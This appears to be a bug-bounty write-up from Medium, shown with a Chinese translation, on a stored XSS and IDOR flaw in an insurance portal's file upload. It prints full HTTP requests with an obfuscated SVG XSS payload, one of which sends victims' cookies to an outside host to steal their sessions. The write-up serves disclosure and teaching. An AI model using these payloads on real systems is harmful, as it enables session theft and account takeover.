<DIV class="fl fm fn fo fp" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<H1 id=9629 class="pw-post-title fq fr fs bf ft fu fv fw fx fy fz ga gb gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="" data-testid="storyTitle">Hijacking Sessions with IDOR and XSS&#8212; @bxmbn </H1>
<H1 class="pw-post-title fq fr fs bf ft fu fv fw fx fy fz ga gb gc gd ge gf gg gh gi gj gk gl gm gn go gp gq gr gs bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="" data-testid="storyTitle"><FONT size=6><SPAN class=headers>Title:</SPAN></B><SPAN class=RefText> &#21163;&#25345;&#20250;&#35805;&#19982; IDOR &#21644; XSS</SPAN></FONT> </H1></DIV>
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<P><SPAN class=headers><SPAN class=headers><SPAN class=headers><SPAN class=headers><SPAN class=headers><SPAN class=headers>Author:</SPAN></B><SPAN class=RefText> bxmbn</SPAN></SPAN></SPAN></SPAN></SPAN></SPAN> </P>
<P><A href="https://bxmbn.medium.com/hijacking-sessions-with-idor-and-xss-bxmbn-396f99761a85"><SPAN class=headers><SPAN class=headers><SPAN class=headers><FONT color=#0066cc><SPAN class=headers><SPAN class=headers>Link:</SPAN></B><SPAN class=RefText> https://bxmbn.medium.com/hijacking-sessions-with-idor-and-xss-bxmbn-396f99761a85</SPAN></FONT></SPAN></FONT></SPAN></SPAN></SPAN></A> 
<P><SPAN class=headers><SPAN class=headers><SPAN class=headers><SPAN class=headers><SPAN class=headers>Source:</SPAN></B><SPAN class=RefText> medium</SPAN></FONT></SPAN></SPAN></SPAN></SPAN></P></DIV>
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">&nbsp;</DIV>
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="cl bh ex ey ez fa" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5"><FIGURE class="ll lm ln lo lp lq li lj paragraph-image" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="li lj lk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5"><PICTURE data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5"><img role=presentation class="bh kq lr c" alt="" src="https://miro.medium.com/v2/resize:fit:296/1*uZVRQLCrYe317Jb21hSecA.png" width=296 height=559 data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-cubox-image-load="false" data-cubox-image-index="2" data-cubox-image-id="bb3fd8001869d0b3d1e128b59023f639" loading="eager"></PICTURE></DIV></FIGURE></DIV></DIV></DIV>
<DIV class="fl fm fn fo fp" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="ab ce" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<DIV class="cl bh ex ey ez fa" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">
<P id=14ef class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Picture a platform designed to handle sensitive documentation &#8212; think insurance claims or identity verification &#8212; turning into a goldmine for attackers. That&#8217;s what I stumbled into while exploring a file upload feature on an insurance-related portal. What began as a quick test ballooned into a cross-site scripting (XSS) vulnerability that could enable mass account takeovers. Let&#8217;s dive in. 
<P>&#24819;&#35937;&#19968;&#20010;&#19987;&#38376;&#22788;&#29702;&#25935;&#24863;&#25991;&#20214;&#30340;&#24179;&#21488;&#8212;&#8212;&#27604;&#22914;&#20445;&#38505;&#32034;&#36180;&#25110;&#36523;&#20221;&#39564;&#35777;&#8212;&#8212;&#21464;&#25104;&#20102;&#25915;&#20987;&#32773;&#30340;&#37329;&#30719;&#12290;&#36825;&#23601;&#26159;&#25105;&#22312;&#25506;&#32034;&#19968;&#20010;&#19982;&#20445;&#38505;&#30456;&#20851;&#30340;&#38376;&#25143;&#32593;&#31449;&#30340;&#25991;&#20214;&#19978;&#20256;&#21151;&#33021;&#26102;&#25152;&#21457;&#29616;&#30340;&#12290;&#26368;&#21021;&#26159;&#19968;&#20010;&#24555;&#36895;&#27979;&#35797;&#65292;&#32467;&#26524;&#28436;&#21464;&#25104;&#20102;&#19968;&#20010;&#36328;&#31449;&#33050;&#26412;&#65288;XSS&#65289;&#28431;&#27934;&#65292;&#36825;&#21487;&#33021;&#23548;&#33268;&#22823;&#35268;&#27169;&#36134;&#25143;&#25509;&#31649;&#12290;&#35753;&#25105;&#20204;&#28145;&#20837;&#25506;&#35752;&#12290;</P>
<H1 id=f584 class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The Entry Point&nbsp;&nbsp;&#20837;&#21475;&#28857;</H1>
<P id=a002 class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The system let users upload files to back up their forms &#8212; a routine feature for this kind of platform. You&#8217;d submit a file, it&#8217;d get linked to a reference number (<STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">refNo</STRONG>) (say,<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">R2326400539<SPAN>&nbsp;</SPAN></STRONG>for a user we&#8217;ll call John), and later you could view it through a separate page: 
<P>&#31995;&#32479;&#20801;&#35768;&#29992;&#25143;&#19978;&#20256;&#25991;&#20214;&#20197;&#22791;&#20221;&#20182;&#20204;&#30340;&#34920;&#21333;&#8212;&#8212;&#36825;&#26159;&#36825;&#31181;&#24179;&#21488;&#30340;&#24120;&#35268;&#21151;&#33021;&#12290;&#24744;&#25552;&#20132;&#19968;&#20010;&#25991;&#20214;&#65292;&#23427;&#20250;&#38142;&#25509;&#21040;&#19968;&#20010;&#21442;&#32771;&#21495;&#30721;&#65288;refNo&#65289;&#65288;&#20363;&#22914;&#65292;&#25105;&#20204;&#31216;&#20043;&#20026;&#32422;&#32752;&#30340;&#29992;&#25143;&#30340; R2326400539&#65289;&#65292;&#28982;&#21518;&#24744;&#21487;&#20197;&#36890;&#36807;&#21333;&#29420;&#30340;&#39029;&#38754;&#26597;&#30475;&#23427;&#65306;</P>
<P id=8410 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">https://[redacted].com/xxx.asp?refNo=<STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">R2326400539</STRONG></P>
<P id=5184 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Nothing fancy on the surface. But when I peeked at the upload request, I spotted a parameter called<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">fileUidList</STRONG><SPAN>&nbsp;</SPAN>&#8212; a string defining the file&#8217;s metadata. Curiosity kicked in: what if I messed with it? 
<P>&#34920;&#38754;&#19978;&#27809;&#26377;&#20160;&#20040;&#33457;&#21736;&#30340;&#12290;&#20294;&#24403;&#25105;&#26597;&#30475;&#19978;&#20256;&#35831;&#27714;&#26102;&#65292;&#25105;&#21457;&#29616;&#20102;&#19968;&#20010;&#21517;&#20026; fileUidList &#30340;&#21442;&#25968;&#8212;&#8212;&#19968;&#20010;&#23450;&#20041;&#25991;&#20214;&#20803;&#25968;&#25454;&#30340;&#23383;&#31526;&#20018;&#12290;&#22909;&#22855;&#24515;&#39537;&#20351;&#25105;&#65306;&#22914;&#26524;&#25105;&#23545;&#23427;&#36827;&#34892;&#24178;&#39044;&#20250;&#24590;&#20040;&#26679;&#65311;</P>
<P id=2bba class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">I crafted a request, slipped an XSS payload into<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">fileUidList</STRONG>, and tied it to a valid reference number, like<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">R2326400540<SPAN>&nbsp;</SPAN></STRONG>in the<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">njfbRefNo<SPAN>&nbsp;</SPAN></STRONG>Parameter. The server didn&#8217;t flinch &#8212; it swallowed my tampered upload whole. 
<P>&#25105;&#21046;&#20316;&#20102;&#19968;&#20010;&#35831;&#27714;&#65292;&#23558;&#19968;&#20010; XSS &#26377;&#25928;&#36733;&#33655;&#25554;&#20837; fileUidList&#65292;&#24182;&#23558;&#20854;&#19982;&#19968;&#20010;&#26377;&#25928;&#30340;&#21442;&#32771;&#32534;&#21495;&#32465;&#23450;&#65292;&#20363;&#22914;&#21442;&#25968; njfbRefNo &#20013;&#30340; R2326400540&#12290;&#26381;&#21153;&#22120;&#27809;&#26377;&#21453;&#24212;&#8212;&#8212;&#23427;&#23436;&#20840;&#25509;&#21463;&#20102;&#25105;&#31713;&#25913;&#30340;&#19978;&#20256;&#12290;</P>
<H1 id=f383 class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Lighting the Fuse&nbsp;&nbsp;&#28857;&#29123;&#23548;&#28779;&#32034;</H1>
<P id=05ca class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Here&#8217;s the request I used to trigger a simple alert 
<P>&#36825;&#26159;&#25105;&#29992;&#26469;&#35302;&#21457;&#31616;&#21333;&#35686;&#25253;&#30340;&#35831;&#27714;</P><PRE class="ob oc od oe of og oh oi bp oj bb bk"><SPAN id=3e1e class="ok mz fs oh b bg ol om l on oo" data-selectable-paragraph=""><MARK class="xh xi ap">POST /[redacted]/[redacted].</MARK><MARK class="xh xi ap"><SPAN class=hljs-keyword>do</SPAN></MARK><MARK class="xh xi ap"> HTTP/1.1<P>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0<P>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<P>Accept-Language: en-US,en;q=0.5<P>Accept-Encoding: gzip, deflate<P>Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714<P>Content-Length: 761<P>Origin: [redacted]<P>Upgrade-Insecure-Requests: 1<P>Sec-Fetch-Dest: document<P>Sec-Fetch-Mode: navigate<P>Sec-Fetch-Site: same-origin<P>Te: trailers<P>Connection: close<P><P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"njfbRefNo"</SPAN></MARK><MARK class="xh xi ap"><P><P>R2326400540<P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"actId"</SPAN></MARK><MARK class="xh xi ap"><P><P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"maxUploadContentSize"</SPAN></MARK><MARK class="xh xi ap"><P><P>104857601<P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"fileUidList"</SPAN></MARK><MARK class="xh xi ap"><P><P>10006630~!~/[redacted]/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"&gt;&lt;svg&gt;&lt;set onbegin="</SPAN></MARK><MARK class="xh xi ap">d=document,b=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>&#39;`&#39;</SPAN></MARK><MARK class="xh xi ap">,d[</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>&#39;loca&#39;</SPAN></MARK><MARK class="xh xi ap">+</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>&#39;tion&#39;</SPAN></MARK><MARK class="xh xi ap">]=</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>&#39;javascript:aler&#39;</SPAN></MARK><MARK class="xh xi ap">+</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>&#39;t&#39;</SPAN></MARK><MARK class="xh xi ap">+b+domain+b</MARK><MARK class="xh xi ap"><SPAN class=hljs-string>"&gt; .png~!~649159<P>-----------------------------25285536543518840322221354714--</SPAN></MARK></SPAN></P></PRE>
<P id=78e5 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Server responded 200 Ok and the XSS payload was now saved into<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">refNo</STRONG><SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">R2326400540</STRONG> 
<P>&#26381;&#21153;&#22120;&#21709;&#24212; 200 Ok&#65292;XSS &#36127;&#36733;&#29616;&#22312;&#24050;&#20445;&#23384;&#21040; refNo R2326400540</P>
<P id=4fbb class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">https://[redacted].com/xxx.asp?refNo=R2326400540</P>
<H1 id=85e8 class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">From XSS to Account Takeover 
<P>&#20174; XSS &#21040;&#36134;&#25143;&#25509;&#31649;</H1>
<P id=5627 class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Since my malicious file was now stored under a user&#8217;s reference ID, it hit me: this could target anyone &#8212; past, present, or future users. Those reference numbers are numeric and predictable, so an attacker could hit them systematically. Even better (or worse), the session cookie &#8212; let&#8217;s call it<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">SESSIONID</STRONG><SPAN>&nbsp;</SPAN>&#8212; wasn&#8217;t flagged as HTTP-only, meaning JavaScript could snatch it. 
<P>&#30001;&#20110;&#25105;&#30340;&#24694;&#24847;&#25991;&#20214;&#29616;&#22312;&#23384;&#20648;&#22312;&#29992;&#25143;&#30340;&#21442;&#32771; ID &#19979;&#65292;&#25105;&#24847;&#35782;&#21040;&#65306;&#36825;&#21487;&#33021;&#20250;&#38024;&#23545;&#20219;&#20309;&#20154;&#8212;&#8212;&#36807;&#21435;&#12289;&#29616;&#22312;&#25110;&#26410;&#26469;&#30340;&#29992;&#25143;&#12290;&#36825;&#20123;&#21442;&#32771;&#21495;&#30721;&#26159;&#25968;&#23383;&#19988;&#21487;&#39044;&#27979;&#30340;&#65292;&#22240;&#27492;&#25915;&#20987;&#32773;&#21487;&#20197;&#31995;&#32479;&#24615;&#22320;&#25915;&#20987;&#23427;&#20204;&#12290;&#26356;&#22909;&#65288;&#25110;&#26356;&#31967;&#65289;&#30340;&#26159;&#65292;session cookie&#8212;&#8212;&#25105;&#20204;&#31216;&#20043;&#20026; SESSIONID&#8212;&#8212;&#27809;&#26377;&#34987;&#26631;&#35760;&#20026; HTTP-only&#65292;&#36825;&#24847;&#21619;&#30528; JavaScript &#21487;&#20197;&#25235;&#21462;&#23427;&#12290;</P>
<P id=5a83 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">I upped the ante with a new payload. This time, I set<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">fileUidList<SPAN>&nbsp;</SPAN></STRONG>to redirect the victim&#8217;s browser to a domain I controlled , appending their cookies to the URL. Here&#8217;s the request: 
<P>&#25105;&#25552;&#39640;&#20102;&#36172;&#27880;&#65292;&#20351;&#29992;&#20102;&#19968;&#20010;&#26032;&#30340;&#26377;&#25928;&#36733;&#33655;&#12290;&#36825;&#19968;&#27425;&#65292;&#25105;&#23558; fileUidList &#35774;&#32622;&#20026;&#23558;&#21463;&#23475;&#32773;&#30340;&#27983;&#35272;&#22120;&#37325;&#23450;&#21521;&#21040;&#25105;&#25511;&#21046;&#30340;&#22495;&#65292;&#24182;&#23558;&#20182;&#20204;&#30340; cookies &#38468;&#21152;&#21040; URL&#12290;&#20197;&#19979;&#26159;&#35831;&#27714;&#65306;</P><PRE class="ob oc od oe of og oh oi bp oj bb bk"><SPAN id=4ec1 class="ok mz fs oh b bg ol om l on oo" data-selectable-paragraph="">POST /[redacted]/[redacted].<SPAN class=hljs-keyword>do</SPAN> HTTP/1.1<P>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0<P>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<P>Accept-Language: en-US,en;q=0.5<P>Accept-Encoding: gzip, deflate<P>Content-Type: multipart/form-data; boundary=---------------------------25285536543518840322221354714<P>Content-Length: 761<P>Origin: [redacted]<P>Upgrade-Insecure-Requests: 1<P>Sec-Fetch-Dest: document<P>Sec-Fetch-Mode: navigate<P>Sec-Fetch-Site: same-origin<P>Te: trailers<P>Connection: close<P><P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=<SPAN class=hljs-string>"njfbRefNo"</SPAN><P><P>R2326400551<P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=<SPAN class=hljs-string>"actId"</SPAN><P><P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=<SPAN class=hljs-string>"maxUploadContentSize"</SPAN><P><P>104857601<P>-----------------------------25285536543518840322221354714<P>Content-Disposition: form-data; name=<SPAN class=hljs-string>"fileUidList"</SPAN><P><P>10006630~!~/[redacted]/a/unix/apps/WAS/FileService/files/[redacted]/2023/9/21~!~xss<SPAN class=hljs-string>"&gt;&lt;svg&gt;&lt;set onbegin="</SPAN>d=document,b=<SPAN class=hljs-string>&#39;`&#39;</SPAN>,d[<SPAN class=hljs-string>&#39;loca&#39;</SPAN>+<SPAN class=hljs-string>&#39;tion&#39;</SPAN>]=<SPAN class=hljs-string>&#39;//bxmbn.com/?&#39;</SPAN>+b+cookie+b<SPAN class=hljs-string>"&gt; .png~!~649159<P>-----------------------------25285536543518840322221354714--</SPAN></SPAN></P></PRE>
<P id=7b69 class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">I uploaded it under<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">R2326400551</STRONG>, loaded the view page, and checked my server. Sure enough, John&#8217;s<SPAN>&nbsp;</SPAN><STRONG class="mc ft" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5">SESSIONID<SPAN>&nbsp;</SPAN></STRONG>landed in my logs. With that token, I could slip into his account &#8212; no password needed. Scale this across all users, and you&#8217;ve got a takeover spree. 
<P>&#25105;&#22312; R2326400551 &#19979;&#19978;&#20256;&#20102;&#23427;&#65292;&#21152;&#36733;&#20102;&#26597;&#30475;&#39029;&#38754;&#65292;&#24182;&#26816;&#26597;&#20102;&#25105;&#30340;&#26381;&#21153;&#22120;&#12290;&#26524;&#28982;&#65292;John &#30340; SESSIONID &#20986;&#29616;&#22312;&#25105;&#30340;&#26085;&#24535;&#20013;&#12290;&#26377;&#20102;&#36825;&#20010;&#20196;&#29260;&#65292;&#25105;&#21487;&#20197;&#36827;&#20837;&#20182;&#30340;&#36134;&#25143;&#8212;&#8212;&#26080;&#38656;&#23494;&#30721;&#12290;&#22914;&#26524;&#23558;&#27492;&#25193;&#23637;&#21040;&#25152;&#26377;&#29992;&#25143;&#65292;&#37027;&#20040;&#20320;&#23601;&#26377;&#20102;&#19968;&#22330;&#25509;&#31649;&#29378;&#28526;&#12290;</P>
<H1 id=9448 class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The Kicker: No Authentication Needed 
<P>&#24341;&#23376;&#65306;&#26080;&#38656;&#35748;&#35777;</H1>
<P id=66e6 class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Here&#8217;s the real shocker: the upload endpoint didn&#8217;t care if I was logged in. I could send these requests anonymously, injecting XSS into anyone&#8217;s files without ever authenticating. No session validation, no access checks &#8212; just an open invitation. That alone makes this a nightmare. 
<P>&#30495;&#27491;&#20196;&#20154;&#38663;&#24778;&#30340;&#26159;&#65306;&#19978;&#20256;&#31471;&#28857;&#24182;&#19981;&#20851;&#24515;&#25105;&#26159;&#21542;&#30331;&#24405;&#12290;&#25105;&#21487;&#20197;&#21311;&#21517;&#21457;&#36865;&#36825;&#20123;&#35831;&#27714;&#65292;&#23558; XSS &#27880;&#20837;&#21040;&#20219;&#20309;&#20154;&#30340;&#25991;&#20214;&#20013;&#65292;&#32780;&#26080;&#38656;&#36827;&#34892;&#36523;&#20221;&#39564;&#35777;&#12290;&#27809;&#26377;&#20250;&#35805;&#39564;&#35777;&#65292;&#27809;&#26377;&#35775;&#38382;&#26816;&#26597;&#8212;&#8212;&#21482;&#26159;&#19968;&#20010;&#20844;&#24320;&#30340;&#36992;&#35831;&#12290;&#20165;&#36825;&#19968;&#28857;&#23601;&#35753;&#20154;&#24863;&#21040;&#19981;&#23506;&#32780;&#26647;&#12290;</P>
<H1 id=edbf class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The Fallout&nbsp;&nbsp;&#36752;&#23556;</H1>
<P id=cfb1 class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The impact is brutal. With predictable IDs and no HTTP-only protection on the session cookie, an attacker could automate this &#8212; uploading malicious files across a swath of reference numbers, then waiting for victims to trip the wire. Every visit to the view page could hand over their session, paving the way for mass account takeovers. Stolen accounts, tampered data, or worse could follow. 
<P>&#24433;&#21709;&#26159;&#27531;&#37239;&#30340;&#12290;&#30001;&#20110;&#20250;&#35805; cookie &#27809;&#26377; HTTP-only &#20445;&#25252;&#65292;&#24182;&#19988; ID &#21487;&#39044;&#27979;&#65292;&#25915;&#20987;&#32773;&#21487;&#20197;&#33258;&#21160;&#21270;&#27492;&#36807;&#31243;&#8212;&#8212;&#36890;&#36807;&#19968;&#31995;&#21015;&#21442;&#32771;&#32534;&#21495;&#19978;&#20256;&#24694;&#24847;&#25991;&#20214;&#65292;&#28982;&#21518;&#31561;&#24453;&#21463;&#23475;&#32773;&#35302;&#21457;&#35686;&#25253;&#12290;&#27599;&#27425;&#35775;&#38382;&#26597;&#30475;&#39029;&#38754;&#37117;&#21487;&#33021;&#20132;&#20986;&#20182;&#20204;&#30340;&#20250;&#35805;&#65292;&#20174;&#32780;&#20026;&#22823;&#35268;&#27169;&#36134;&#25143;&#25509;&#31649;&#38138;&#24179;&#36947;&#36335;&#12290;&#31363;&#21462;&#30340;&#36134;&#25143;&#12289;&#31713;&#25913;&#30340;&#25968;&#25454;&#65292;&#25110;&#32773;&#26356;&#31967;&#31957;&#30340;&#24773;&#20917;&#21487;&#33021;&#20250;&#38543;&#20043;&#32780;&#26469;&#12290;</P>
<P id=28fe class="pw-post-body-paragraph ma mb fs mc b md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">The lack of authentication on the upload endpoint seals the deal. You don&#8217;t need an account to pull this off &#8212; just a connection and some reference IDs. And since future uploads inherit the same flaw, this could haunt the platform indefinitely. 
<P>&#19978;&#20256;&#31471;&#28857;&#32570;&#20047;&#36523;&#20221;&#39564;&#35777;&#20351;&#24471;&#36825;&#19968;&#20999;&#21464;&#24471;&#31616;&#21333;&#12290;&#20320;&#19981;&#38656;&#35201;&#19968;&#20010;&#36134;&#25143;&#23601;&#21487;&#20197;&#20570;&#21040;&#36825;&#19968;&#28857;&#8212;&#8212;&#21482;&#38656;&#19968;&#20010;&#36830;&#25509;&#21644;&#19968;&#20123;&#21442;&#32771; ID&#12290;&#30001;&#20110;&#26410;&#26469;&#30340;&#19978;&#20256;&#20063;&#20250;&#32487;&#25215;&#21516;&#26679;&#30340;&#32570;&#38519;&#65292;&#36825;&#21487;&#33021;&#20250;&#26080;&#38480;&#26399;&#22320;&#22256;&#25200;&#35813;&#24179;&#21488;&#12290;</P>
<H1 id=8358 class="my mz fs bf na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt nu nv bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-selectable-paragraph=""><STRONG class=am data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1">Scoring the Damage&nbsp;&nbsp;&#35780;&#20998;&#25439;&#23475;</STRONG></H1>
<P id=e8a5 class="pw-post-body-paragraph ma mb fs mc b md nw mf mg mh nx mj mk ml ny mn mo mp nz mr ms mt oa mv mw mx fl bk" data-immersive-translate-walked="7a3662f1-4f11-4b68-a7e9-0a3ae96baec5" data-immersive-translate-paragraph="1" data-selectable-paragraph="">Using the CVSS 3.1 calculator, this scores high: network-accessible, low complexity, no privileges required, user interaction needed, and a scope change leaking high-confidentiality data. Factor in the critical nature of the data involved, and it&#8217;s a top-tier issue. 
